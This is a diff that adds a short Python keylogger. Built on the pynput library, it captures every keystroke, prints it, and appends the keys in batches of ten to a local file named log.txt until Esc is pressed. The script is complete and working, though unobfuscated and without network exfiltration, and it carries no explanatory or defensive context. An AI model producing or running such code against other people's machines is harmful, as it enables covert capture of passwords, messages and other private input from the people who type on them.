@@ -1,0 +1,26 @@
+from pynput import keyboard
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+    print(key)
+    keys.append(str(key))
+    count += 1
+    if count >= 10:
+        write_file(keys)
+        keys = []
+        count = 0
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(key + "\n")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
